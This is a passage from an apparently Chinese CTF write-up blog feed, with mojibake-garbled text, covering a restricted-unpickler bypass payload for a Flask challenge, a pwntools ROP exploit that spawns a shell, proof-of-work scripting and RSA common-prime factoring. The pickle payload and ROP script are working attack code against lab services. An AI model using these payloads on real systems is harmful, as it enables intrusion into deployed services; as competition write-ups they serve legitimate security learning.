class="subst">&#123;self.age!r&#125;</span>)&#x27;</span></span><br><span class="line">    <span class="comment">#==åˆ¤æ–­</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__eq__</span>(<span class="params">self, other</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">type</span>(other) <span class="keyword">is</span>  people <span class="keyword">and</span> self.name == other.name <span class="keyword">and</span> self.sex == other.sex <span class="keyword">and</span> self.age==other.age</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="keyword">if</span> module[<span class="number">0</span>:<span class="number">8</span>] == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[<span class="string">&#x27;__main__&#x27;</span>], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">here_load</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;source&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> Response(read(__file__),mimetype=<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">&quot;/?source=&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/app&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inll</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pickle_data = request.form.get(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> base64.b64decode(pickle_data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;no no no&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = here_load(base64.b64decode(pickle_data))</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">type</span>(result) <span class="keyword">is</span> <span class="keyword">not</span> people:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ&#x27;</span></span><br><span class="line">            correct = (result == people(b.name, b.sex, b.age))</span><br><span class="line">            <span class="keyword">if</span> correct:</span><br><span class="line">                <span class="keyword">return</span> Response(read(<span class="string">&#x27;/flag.txt&#x27;</span>))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> Response(<span class="built_in">str</span>(e))</span><br><span class="line"></span><br><span class="line">    test = people(<span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;test&#x27;</span>,<span class="string">&#x27;55&#x27;</span>)</span><br><span class="line">    pickle_data = base64.b64encode(pickle.dumps(test)).decode()</span><br><span class="line">    <span class="keyword">return</span> Response(pickle_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p>é™åˆ¶ä¸­ï¼Œæ”¹å†™äº†<code>find_class</code>å‡½æ•°ï¼Œåªèƒ½ç”Ÿæˆ<code>__main__</code>æ¨¡å—çš„pickleï¼Œæ­¤å¤–ï¼Œç¦æ­¢äº†<code>b&#39;R&#39;</code>ã€‚</p><p>ç›®æ ‡æ˜¯è¦†ç›– <code>b</code> ä¸­çš„éªŒè¯ï¼Œç”±äº <code>b</code> è¢«ä¸»ç¨‹åºå¼•å…¥ï¼Œæ˜¯å­˜åœ¨äº<code>__main__</code>ä¸‹çš„ <code>b</code> æ¨¡å—ä¸­çš„ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥è¦†ç›–æ‰ï¼Œæ­¤æ—¶å°±æˆåŠŸç»•è¿‡äº†é™åˆ¶ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">people</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, sex, age</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.sex = sex</span><br><span class="line">        self.age=age</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;people(name=<span class="subst">&#123;self.name!r&#125;</span>, category=<span class="subst">&#123;self.sex!r&#125;</span>, age=<span class="subst">&#123;self.age!r&#125;</span>)&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__eq__</span>(<span class="params">self, other</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">type</span>(other) <span class="keyword">is</span>  people <span class="keyword">and</span> self.name == other.name <span class="keyword">and</span> self.sex == other.sex <span class="keyword">and</span> self.age==other.age</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(pickle.dumps(people(&#x27;aaa&#x27;,&#x27;bbb&#x27;,&#x27;ccc&#x27;)))</span></span><br><span class="line"></span><br><span class="line">data=<span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">b</span></span><br><span class="line"><span class="string">(S&#x27;name&#x27;</span></span><br><span class="line"><span class="string">S&quot;aaa&quot;</span></span><br><span class="line"><span class="string">S&quot;sex&quot;</span></span><br><span class="line"><span class="string">S&quot;bbb&quot;</span></span><br><span class="line"><span class="string">S&quot;age&quot;</span></span><br><span class="line"><span class="string">S&quot;ccc&quot;</span></span><br><span class="line"><span class="string">db0(S&quot;aaa&quot;</span></span><br><span class="line"><span class="string">S&quot;bbb&quot;</span></span><br><span class="line"><span class="string">S&quot;ccc&quot;</span></span><br><span class="line"><span class="string">i__main__</span></span><br><span class="line"><span class="string">people</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(data).decode())</span><br><span class="line"></span><br><span class="line"><span class="comment">#Y19fbWFpbl9fCmIKKFMnbmFtZScKUyJhYWEiClMic2V4IgpTImJiYiIKUyJhZ2UiClMiY2NjIgpkYjAoUyJhYWEiClMiYmJiIgpTImNjYyIKaV9fbWFpbl9fCnBlb3BsZQou</span></span><br></pre></td></tr></table></figure><p>POSTæ–¹å¼åœ¨ <code>/app</code> è·¯ç”±ä¼ å…¥å‚æ•° <code>data</code>ï¼Œå¾—åˆ°flagã€‚</p><p><strong>FLAG:</strong> <code>flag&#123;2Vl49keFDTMN3frBo6HOYw0djCGzIcPQ&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;p&gt;èƒ½æºç½‘ç»œå®‰å…¨æ˜¯å›½å®¶å®æ–½èƒ½æºå®‰å…¨æˆ˜ç•¥çš„é‡è¦ä¿éšœã€‚åœ¨å›½å®¶â€œç¢³è¾¾å³°ã€ç¢³ä¸­å’Œâ€æˆ˜ç•¥ç›®æ ‡å¼•é¢†ä¸‹ï¼Œä»¥æ–°èƒ½æºä¸ºä¸»ä½“çš„æ–°å‹ç”µåŠ›ç³»ç»Ÿæ­£åŠ å¿«å»ºè®¾ï¼Œèƒ½æºä¼ä¸šæ•°å­—åŒ–è½¬å‹åŠ é€Ÿå‘å±•ï¼Œæˆ‘å›½èƒ½æºç½‘ç»œå®‰å…¨é£é™©æŒ‘æˆ˜ä»å°†æŒç»­å¢å¤§ã€‚ä¸ºæ·±å…¥è´¯å½»ä¹ è¿‘å¹³æ€»ä¹¦è®°å…³äºåˆ‡å®åšå¥½å›½å®¶å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½å®‰</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021èµ›" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2021ç¾ŠåŸæ¯ç½‘ç»œå®‰å…¨å¤§èµ›</title>
    <link href="https://lazzzaro.github.io/2021/09/12/match-2021%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2021/09/12/match-2021%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</id>
    <published>2021-09-11T17:14:50.000Z</published>
    <updated>2021-09-11T19:04:16.364Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    </p><p>å¤§èµ›ç”±ä¸­å…±å¹¿å·å¸‚å§”ç½‘ç»œå®‰å…¨å’Œä¿¡æ¯åŒ–å§”å‘˜ä¼šåŠå…¬å®¤ä½œä¸ºæŒ‡å¯¼å•ä½ï¼Œå¹¿å·å¸‚ç½‘ç»œå®‰å…¨äº§ä¸šä¿ƒè¿›ä¼šä¸»åŠï¼Œå¹¿ä¸œå¤–è¯­å¤–è´¸å¤§å­¦ã€æ·±ä¿¡æœç§‘æŠ€è‚¡ä»½æœ‰é™å…¬å¸æ‰¿åŠï¼Œå¹¿å·å¸‚ä¿¡æ¯å®‰å…¨æµ‹è¯„ä¸­å¿ƒã€å¹¿å·äº’è”ç½‘åä¼šååŠã€‚</p><p>å¤§èµ›ä»¥â€œç½‘ç»œå®‰å…¨ä¸ºäººæ°‘ã€ç½‘ç»œå®‰å…¨é äººæ°‘â€ä¸ºä¸»é¢˜ï¼Œæ—¨åœ¨é€šè¿‡ç«èµ›çš„æ–¹å¼æé«˜å‚èµ›é€‰æ‰‹æ”»é˜²å…¼å¤‡çš„ç½‘ç»œå®‰å…¨å®è·µæŠ€èƒ½ï¼Œå®ç°ä»¥èµ›ä¿ƒå­¦ã€ä»¥èµ›ä¼šå‹ï¼ŒåŠ å¼ºä¸åŒé™¢æ ¡åŠå•ä½é—´çš„æŠ€æœ¯äº¤æµã€‚</p><p>Rank: ä¼äº‹ä¸šå•ä½ç»„12</p><hr><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Ez-android"><a href="#Ez-android" class="headerlink" title="Ez_android"></a>Ez_android</h3><blockquote><p>Just an easy sign in!</p></blockquote><p>jadxæŸ¥çœ‹<code>MainActivity</code>ç±»ã€‚</p><p><code>onClink</code>å‡½æ•°å…ˆéªŒè¯usernameå’Œpasswordï¼Œåœ¨èµ„æºæ–‡ä»¶æŸ¥åˆ°usernameä¸º<code>admin</code>ï¼ŒåŠ å¯†å¤„ç†åçš„passwordå€¼ä¸º<code>c232666f1410b3f5010dc51cec341f58</code>ï¼Œåˆ<code>getEncodeStr</code>å‡½æ•°å¯¹passwordçš„md5ç»“æœæ¯ä¸€byteåšäº†å‡1å¤„ç†ï¼Œè¿˜åŸå¾—åˆ°<code>c33367701511b4f6020ec61ded352059</code>ï¼ŒæŸ¥åˆ°å¯¹åº”çš„åŸå€¼ä¸º<code>654321</code>ã€‚</p><p>æ¥ä¸‹æ¥æ‰§è¡Œ<code>getKeyAndRedirect</code>å‡½æ•°ï¼Œä¼ å…¥passwordå€¼<code>654321</code>ï¼Œè¿›å…¥socketäº¤äº’ï¼ˆ<code>nc 139.224.191.201 20080</code>ï¼‰ï¼Œè¾“å…¥passwordï¼Œæ‹¿åˆ°keyå­—ç¬¦ä¸²ï¼š</p><p>key=<code>TGtUnkaJD0frq61uCQYw3-FxMiRvNOB/EWjgVcpKSzbs8yHZ257X9LldIeh4APom</code></p><p>åœ¨<code>getKeyAndRedirect</code>å‡½æ•°ä¸­æœ€åå°†keyä¼ é€’åˆ°<code>CheckFlagActivity</code>ï¼Œåœ¨<code>CheckFlagActivity</code>ä¸­<code>checkFlag</code>å‡½æ•°è°ƒç”¨<code>EncodeUtils</code>ç±»å®ç°base64ç¼–ç ï¼Œkeyä¸ºç è¡¨ï¼ŒencodeFlagä¸ºç¼–ç ç»“æœï¼š</p><p>encodeFlag=<code>3lkHi9iZNK87qw0p6U391t92qlC5rwn5iFqyMFDl1t92qUnL6FQjqln76l-P</code></p><p>è·‘æ›´æ¢ç è¡¨base64è§£ç ç®—æ³•è¿˜åŸflagï¼šSangFor{212f4548-03d1-11ec-ab68-00155db3a27e}</p><p>â€‹    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="BabyRop"><a href="#BabyRop" class="headerlink" title="BabyRop"></a>BabyRop</h3><p>æœ‰<code>system</code>å‡½æ•°å’Œ<code>/cin/sh</code>ï¼Œç®€å•ROPï¼Œç¼ºå°‘çš„<code>/bin/sh\x00</code>å¯ä»¥ç”¨<code>sh\x00</code>ä»£æ›¿ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;192.168.42.14&#x27;</span>, <span class="number">11000</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./BabyRop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">sda = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line"></span><br><span class="line">sh_addr = <span class="number">0x0804c029</span></span><br><span class="line">system_addr = <span class="number">0x80490a0</span></span><br><span class="line">pay = <span class="string">&#x27;A&#x27;</span> * (<span class="number">0x28</span> + <span class="number">4</span>) + p32(system_addr) + p32(<span class="number">0</span>) + p32(sh_addr)</span><br><span class="line">pause()</span><br><span class="line">sl(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="RingRingRing"><a href="#RingRingRing" class="headerlink" title="RingRingRing"></a>RingRingRing</h3><blockquote><p>ring a ring a ring ring a ring a ring</p></blockquote><p>ncæµ‹è¯•md5-PoWä¹‹åï¼Œéœ€è¦è¾“å…¥100ç»„a,b,c,d,eï¼Œä½¿å¾— $a^4+b^4+c^4+d^4=e^2$ï¼Œä¸”éƒ½ä¸èƒ½ä¸º0ã€‚</p><p>æ„é€  $1^4+1^4+1^4+1^4=2^2$ï¼Œå†æŒ‰å€æ•°åšä¹˜ç§¯ $k^4+k^4+k^4+k^4=(2k^2)^2,k \in [1,100]$ï¼Œå¾—åˆ°100ç»„ç”¨ä¾‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> parse <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> bruteforce</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_force</span>(<span class="params">prefix,s</span>):</span></span><br><span class="line"><span class="keyword">return</span> bruteforce(<span class="keyword">lambda</span> x:md5(x+prefix).hexdigest()[<span class="number">0</span>:<span class="number">5</span>]==s,string.ascii_letters+string.digits,length=<span class="number">4</span>,method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;192.168.42.14&#x27;</span>,<span class="number">2378</span>)</span><br><span class="line">prefix, s = parse(<span class="string">&quot;Please find a string that md5(str + &#123;&#125;)[0:5] == &#123;&#125;&quot;</span>,r.recvline())</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;[&gt;] Give me xxxxx: &#x27;</span>,brute_force(prefix,s))</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">101</span>):</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;[&gt;] a: &#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;[&gt;] b: &#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;[&gt;] c: &#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;[&gt;] d: &#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;[&gt;] e: &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>*i*i))</span><br><span class="line"><span class="built_in">print</span>(r.recvline())</span><br><span class="line"><span class="built_in">print</span>(r.recvline())</span><br><span class="line"><span class="comment">#GWHT&#123;a_funny_equation&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="Easy-Rsa"><a href="#Easy-Rsa" class="headerlink" title="Easy_Rsa"></a>Easy_Rsa</h3><blockquote><p>ä½ äº†è§£RSAå—???</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_prime</span>(<span class="params">nbits, gamma</span>):</span></span><br><span class="line">    g = getPrime(<span class="built_in">int</span>(nbits * gamma))</span><br><span class="line">    alpha = <span class="number">0.5</span> - gamma</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = getRandomNBitInteger(<span class="built_in">int</span>(alpha * nbits))</span><br><span class="line">        p = <span class="number">2</span> * g * a + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            b = getRandomNBitInteger(<span class="built_in">int</span>(alpha * nbits))</span><br><span class="line">            q = <span class="number">2</span> * g * b + <span class="number">1</span></span><br><span class="line">            h = <span class="number">2</span> * g * a * b + a + b</span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> isPrime(q) <span class="keyword">or</span> isPrime(h) <span class="keyword">or</span> gmpy2.gcd(a, b) != <span class="number">1</span>:</span><br><span class="line">                b = getRandomNBitInteger(<span class="built_in">int</span>(alpha * nbits))</span><br><span class="line">                q = <span class="number">2</span> * g * b + <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">nbits, gamma</span>):</span></span><br><span class="line">    p, q = gen_prime(nbits, gamma)</span><br><span class="line">    n = p * q</span><br><span class="line">    e = getPrime(<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">while</span> gmpy2.gcd(e, gmpy2.lcm(p-<span class="number">1</span>,q-<span class="number">1</span>)) != <span class="number">1</span>:</span><br><span class="line">        e = getPrime(<span class="number">16</span>)</span><br><span class="line">    m = bytes_to_long(flag)</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    <span class="keyword">return</span> n, e, c</span><br><span class="line"></span><br><span class="line">n, e, c = encrypt(<span class="number">1024</span>, <span class="number">0.48</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;n =&#x27;</span>, n</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;e =&#x27;</span>, e</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;c =&#x27;</span>, c</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 84236796025318186855187782611491334781897277899439717384242559751095347166978304126358295609924321812851255222430530001043539925782811895605398187299748256080526691975084042025794113521587064616352833904856626744098904922117855866813505228134381046907659080078950018430266048447119221001098505107823645953039</span></span><br><span class="line"><span class="comment"># e = 58337</span></span><br><span class="line"><span class="comment"># c = 13646200911032594651110040891135783560995665642049282201695300382255436792102048169200570930229947213493204600006876822744757042959653203573780257603577712302687497959686258542388622714078571068849217323703865310256200818493894194213812410547780002879351619924848073893321472704218227047519748394961963394668</span></span><br></pre></td></tr></table></figure></blockquote><p>å…±ç´ æ•°æ”»å‡»ï¼ˆcommon prime RSAï¼‰ã€‚</p><p>ç»™å‡º $N=pq,p-1=2ga,q-1=2gb,h=2gab+a+b$ï¼Œæœ‰ $N-1=2gh$ï¼Œ</p><p>æ‰€ä»¥ $x^{N-1} \pmod p$ è‡³å¤šæœ‰ $a$ ä¸ªå€¼ï¼Œç”¨ $x \rightarrow x^{N-1}+3$ ä»£æ›¿ Pollardâ€™s rhoç®—æ³•ä¸­è¿­ä»£å‡½æ•°ï¼Œèƒ½åœ¨ $\text{O}(\sqrt{a})=\text{O}(N^{\frac{1}{4}-\frac{\gamma}{2}})$ ä¸‹åˆ†è§£ $N$ã€‚</p><p>common prime RSAåœ¨ $g$ è¿‡å°æ—¶ï¼Œ $g$ ä¹Ÿèƒ½è½»æ˜“é€šè¿‡åˆ†è§£ $N-1$ æ¥è§£å‡ºã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">x, n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">pow</span>(x, n - <span class="number">1</span>, n) + <span class="number">3</span>) % n</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rho</span>(<span class="params">n</span>):</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = getRandomRange(<span class="number">2</span>, n)</span><br><span class="line">        b = f(a, n)</span><br><span class="line">        j = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            p = GCD(<span class="built_in">abs</span>(a - b), n)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;&#123;&#125; in &#123;&#125; circle&#x27;</span>.<span class="built_in">format</span>(j, i))</span><br><span class="line">            <span class="keyword">if</span> p == n:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> p &gt; <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> (p, n // p)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                a = f(a, n)</span><br><span class="line">                b = f(f(b, n), n)</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">84236796025318186855187782611491334781897277899439717384242559751095347166978304126358295609924321812851255222430530001043539925782811895605398187299748256080526691975084042025794113521587064616352833904856626744098904922117855866813505228134381046907659080078950018430266048447119221001098505107823645953039</span></span><br><span class="line">e = <span class="number">58337</span></span><br><span class="line">c = <span class="number">13646200911032594651110040891135783560995665642049282201695300382255436792102048169200570930229947213493204600006876822744757042959653203573780257603577712302687497959686258542388622714078571068849217323703865310256200818493894194213812410547780002879351619924848073893321472704218227047519748394961963394668</span></span><br><span class="line"></span><br><span class="line">p, q = rho(n)</span><br><span class="line">d = gmpy2.invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#b&#x27;SangFor&#123;0a8c2220-4c1b-32c8-e8c1-adf92ec7678b&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="Bigrsa"><a href="#Bigrsa" class="headerlink" title="Bigrsa"></a>Bigrsa</h3><blockquote><p>BigRSAï¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n1 = <span 